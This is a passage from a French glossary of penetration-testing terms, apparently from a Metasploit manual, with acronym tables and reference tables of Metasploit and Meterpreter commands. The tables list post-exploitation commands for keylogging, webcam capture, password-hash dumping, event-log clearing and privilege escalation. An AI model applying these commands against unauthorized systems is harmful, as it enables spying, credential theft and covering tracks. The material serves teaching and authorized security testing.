**IDS (Intrusion Detection System)**  
Système qui surveille le trafic réseau ou les activités système pour détecter les tentatives d'intrusion.

**Impacket**  
Collection de classes Python pour travailler avec les protocoles réseau, particulièrement utile pour les tests d'intrusion.

**IPS (Intrusion Prevention System)**  
Système qui surveille le réseau et peut bloquer activement les tentatives d'intrusion détectées.

### K

**Kali Linux**  
Distribution Linux spécialisée dans les tests de pénétration et l'audit de sécurité, incluant Metasploit préinstallé.

**Kerberos**  
Protocole d'authentification réseau utilisé dans les environnements Windows.

**Kerbrute**  
Outil permettant de bruteforcer et d'énumérer des comptes valides dans un domaine Kerberos.

**Kiwi (anciennement Mimikatz)**  
Extension Meterpreter qui permet d'extraire des identifiants, des hachages et des tickets Kerberos.

### L

**LHOST (Local Host)**  
Adresse IP de la machine attaquante, utilisée pour les connexions de retour des payloads.

**LPORT (Local Port)**  
Port sur la machine attaquante qui attend les connexions des payloads.

**Lateral Movement (Mouvement latéral)**  
Techniques utilisées pour se déplacer d'un système compromis à un autre au sein d'un réseau.

**Loot**  
Dans Metasploit, désigne les données sensibles récupérées des systèmes compromis (hachages, fichiers, etc.).

### M

**Meterpreter**  
Payload avancé de Metasploit qui fournit une interface interactive pour explorer et exploiter les systèmes compromis.

**Metasploit Framework**  
Framework open-source pour le développement, les tests et l'exécution d'exploits.

**Metasploit Pro**  
Version commerciale de Metasploit avec des fonctionnalités avancées comme le reporting automatisé.

**Mimikatz**  
Outil permettant d'extraire des mots de passe en clair, des hachages et des tickets Kerberos de la mémoire Windows.

**Module**  
Composant individuel dans Metasploit qui remplit une fonction spécifique (exploit, payload, auxiliaire, etc.).

**MSF (Metasploit Framework)**  
Abréviation courante pour désigner le Metasploit Framework.

**MSSQL**  
Système de gestion de base de données relationnelle développé par Microsoft.

### N

**Nessus**  
Scanner de vulnérabilités commercial développé par Tenable.

**Netcat**  
Utilitaire réseau polyvalent pour lire et écrire des données via des connexions réseau TCP ou UDP.

**Nmap**  
Outil open-source de découverte réseau et d'audit de sécurité.

**NSE (Nmap Scripting Engine)**  
Système de scripts pour Nmap permettant d'étendre ses fonctionnalités.

**NTLM (NT LAN Manager)**  
Suite de protocoles d'authentification Microsoft utilisée dans les environnements Windows.

### O

**OSINT (Open Source Intelligence)**  
Collecte et analyse d'informations provenant de sources publiquement accessibles.

**OpenVAS**  
Scanner de vulnérabilités open-source, alternative à Nessus.

### P

**Pass-the-Hash**  
Technique d'attaque qui utilise un hachage de mot de passe capturé pour s'authentifier sans connaître le mot de passe en clair.

**Payload**  
Code qui s'exécute sur un système cible après exploitation d'une vulnérabilité.

**Pentest (Test de pénétration)**  
Test de sécurité autorisé qui simule une attaque réelle pour identifier les vulnérabilités.

**Persistence**  
Techniques utilisées pour maintenir l'accès à un système compromis après un redémarrage.

**Pivoting**  
Technique qui utilise un système compromis comme point de rebond pour accéder à d'autres systèmes du réseau.

**Port**  
Point d'extrémité de communication dans un système d'exploitation, identifié par un numéro.

**Post-exploitation**  
Phase d'un test d'intrusion qui se déroule après la compromission initiale d'un système.

**PostgreSQL**  
Système de gestion de base de données relationnelle utilisé par Metasploit pour stocker les données.

**PowerShell Empire**  
Framework post-exploitation qui utilise des agents PowerShell.

**Privilege Escalation (Élévation de privilèges)**  
Processus d'obtention de privilèges supérieurs à ceux initialement accordés.

**PSExec**  
Outil Microsoft qui permet l'exécution de processus sur des systèmes distants, souvent utilisé pour le mouvement latéral.

### R

**Rank**  
Système de classification de la fiabilité des exploits dans Metasploit (Excellent, Great, Good, etc.).

**Reconnaissance**  
Phase initiale d'un test d'intrusion qui consiste à collecter des informations sur la cible.

**Reverse Shell**  
Type de payload qui initie une connexion depuis la machine cible vers l'attaquant.

**RHOSTS (Remote Hosts)**  
Paramètre Metasploit qui spécifie la ou les cibles d'une attaque.

**RPORT (Remote Port)**  
Paramètre Metasploit qui spécifie le port cible d'une attaque.

**Ruby**  
Langage de programmation dans lequel Metasploit est principalement écrit.

### S

**SAM (Security Accounts Manager)**  
Base de données Windows qui stocke les mots de passe des utilisateurs locaux.

**Scanner**  
Module qui identifie les systèmes, services ou vulnérabilités sur un réseau.

**Searchsploit**  
Utilitaire en ligne de commande pour rechercher des exploits dans la base de données Exploit-DB.

**Service**  
Programme qui s'exécute en arrière-plan sur un système, souvent accessible via le réseau.

**Session**  
Dans Metasploit, connexion établie avec un système compromis.

**Shell**  
Interface en ligne de commande qui permet d'interagir avec un système d'exploitation.

**SMB (Server Message Block)**  
Protocole réseau utilisé pour partager des fichiers, des imprimantes et d'autres ressources entre des ordinateurs Windows.

**SMTP (Simple Mail Transfer Protocol)**  
Protocole utilisé pour l'envoi d'emails.

**Sniffing**  
Interception et analyse du trafic réseau.

**Social Engineering (Ingénierie sociale)**  
Techniques psychologiques utilisées pour manipuler des personnes afin qu'elles divulguent des informations confidentielles ou effectuent des actions spécifiques.

**Spear Phishing**  
Attaque de phishing ciblée visant des individus ou organisations spécifiques.

**SQL Injection**  
Technique d'attaque qui consiste à injecter du code SQL malveillant dans une application.

**SSH (Secure Shell)**  
Protocole réseau sécurisé utilisé pour l'administration à distance de systèmes.

**SSL/TLS**  
Protocoles cryptographiques qui sécurisent les communications sur Internet.

### T

**Target**  
Système, réseau ou application visé par un test d'intrusion.

**Telnet**  
Protocole réseau non sécurisé utilisé pour l'accès à distance à des systèmes.

**Token**  
Objet qui représente le droit d'accéder à une ressource protégée.

### U

**UAC (User Account Control)**  
Fonctionnalité de sécurité Windows qui demande une confirmation avant d'exécuter des actions nécessitant des privilèges administratifs.

**UDP (User Datagram Protocol)**  
Protocole de communication réseau sans connexion.

### V

**Vulnerability (Vulnérabilité)**  
Faiblesse dans un système qui peut être exploitée pour compromettre sa sécurité.

**VNC (Virtual Network Computing)**  
Système de partage de bureau graphique qui utilise le protocole RFB (Remote Frame Buffer).

**VPN (Virtual Private Network)**  
Technologie qui crée une connexion sécurisée sur un réseau public.

### W

**WAF (Web Application Firewall)**  
Firewall spécialisé dans la protection des applications web.

**Web Shell**  
Script malveillant téléchargé sur un serveur web qui permet l'exécution de commandes à distance.

**Windows Management Instrumentation (WMI)**  
Infrastructure Microsoft pour la gestion des données et opérations sur les systèmes Windows.

**Wireshark**  
Analyseur de protocole réseau open-source.

**Wordlist**  
Liste de mots utilisée pour les attaques par dictionnaire ou par force brute.

**Workspace**  
Dans Metasploit, espace de travail isolé qui permet de séparer les données de différents projets.

### X

**XSS (Cross-Site Scripting)**  
Vulnérabilité web qui permet l'injection de scripts côté client dans des pages web consultées par d'autres utilisateurs.

### Z

**Zero-day**  
Vulnérabilité non corrigée et non publiquement connue, pour laquelle aucun correctif n'est disponible.

**Zombies**  
Systèmes compromis contrôlés à distance, généralement dans le cadre d'un botnet.

## Acronymes courants

| Acronyme | Signification |
|----------|---------------|
| AD | Active Directory |
| AV | Antivirus |
| C2 | Command and Control |
| CSRF | Cross-Site Request Forgery |
| CVE | Common Vulnerabilities and Exposures |
| CVSS | Common Vulnerability Scoring System |
| DLL | Dynamic Link Library |
| DNS | Domain Name System |
| DoS | Denial of Service |
| FTP | File Transfer Protocol |
| HTTP | Hypertext Transfer Protocol |
| HTTPS | Hypertext Transfer Protocol Secure |
| IDS | Intrusion Detection System |
| IoC | Indicator of Compromise |
| IoT | Internet of Things |
| IPS | Intrusion Prevention System |
| LFI | Local File Inclusion |
| LLMNR | Link-Local Multicast Name Resolution |
| MITM | Man-in-the-Middle |
| MSF | Metasploit Framework |
| NBNS | NetBIOS Name Service |
| NTLM | NT LAN Manager |
| OSINT | Open Source Intelligence |
| RCE | Remote Code Execution |
| RDP | Remote Desktop Protocol |
| RFI | Remote File Inclusion |
| SMB | Server Message Block |
| SMTP | Simple Mail Transfer Protocol |
| SNMP | Simple Network Management Protocol |
| SQL | Structured Query Language |
| SSH | Secure Shell |
| SSL | Secure Sockets Layer |
| SSRF | Server-Side Request Forgery |
| TLS | Transport Layer Security |
| UAC | User Account Control |
| VNC | Virtual Network Computing |
| VPN | Virtual Private Network |
| WAF | Web Application Firewall |
| WMI | Windows Management Instrumentation |
| XSS | Cross-Site Scripting |

## Commandes Metasploit essentielles

| Commande | Description |
|----------|-------------|
| `help` | Affiche l'aide générale ou l'aide d'une commande spécifique |
| `search` | Recherche des modules dans la base de données Metasploit |
| `use` | Sélectionne un module à utiliser |
| `info` | Affiche des informations sur un module |
| `show options` | Affiche les options disponibles pour le module actuel |
| `set` | Définit une valeur pour une option |
| `setg` | Définit une valeur globale pour une option |
| `unset` | Supprime une valeur d'option |
| `exploit` | Lance l'exploitation avec le module actuel |
| `run` | Équivalent à `exploit` pour les modules non-exploit |
| `check` | Vérifie si la cible est vulnérable sans l'exploiter |
| `sessions` | Gère les sessions actives |
| `background` | Met la session actuelle en arrière-plan |
| `jobs` | Affiche et gère les jobs en cours d'exécution |
| `db_status` | Vérifie l'état de la connexion à la base de données |
| `db_nmap` | Exécute Nmap et stocke les résultats dans la base de données |
| `hosts` | Affiche et gère les hôtes dans la base de données |
| `services` | Affiche et gère les services dans la base de données |
| `vulns` | Affiche et gère les vulnérabilités dans la base de données |
| `loot` | Affiche et gère les données extraites |
| `workspace` | Gère les workspaces dans la base de données |
| `spool` | Redirige la sortie vers un fichier |
| `resource` | Exécute les commandes d'un fichier resource |
| `load` | Charge un plugin ou une extension |
| `version` | Affiche la version de Metasploit |

## Commandes Meterpreter essentielles

| Commande | Description |
|----------|-------------|
| `help` | Affiche l'aide de Meterpreter |
| `background` | Met la session Meterpreter en arrière-plan |
| `exit` | Termine la session Meterpreter |
| `sysinfo` | Affiche les informations système |
| `getuid` | Affiche l'utilisateur actuel |
| `getpid` | Affiche le PID du processus Meterpreter |
| `ps` | Affiche les processus en cours d'exécution |
| `kill` | Termine un processus |
| `migrate` | Migre vers un autre processus |
| `execute` | Exécute une commande |
| `shell` | Ouvre un shell système |
| `pwd` | Affiche le répertoire de travail actuel |
| `ls` | Liste les fichiers et répertoires |
| `cd` | Change de répertoire |
| `cat` | Affiche le contenu d'un fichier |
| `download` | Télécharge un fichier de la cible |
| `upload` | Téléverse un fichier vers la cible |
| `search` | Recherche des fichiers |
| `screenshot` | Capture l'écran |
| `webcam_snap` | Prend une photo avec la webcam |
| `keyscan_start` | Démarre l'enregistrement des frappes clavier |
| `keyscan_dump` | Affiche les frappes enregistrées |
| `keyscan_stop` | Arrête l'enregistrement des frappes |
| `hashdump` | Extrait les hachages de mots de passe |
| `clearev` | Efface les journaux d'événements |
| `getsystem` | Tente d'élever les privilèges |
| `load` | Charge une extension Meterpreter |
| `run` | Exécute un script post-exploitation |
| `portfwd` | Configure le transfert de port |
| `route` | Configure le routage pour le pivoting |

Ce glossaire constitue une référence pratique pour comprendre les termes techniques utilisés dans ce manuel. Il peut également servir de base pour approfondir vos connaissances dans le domaine du pentest et de l'utilisation du Metasploit Framework.
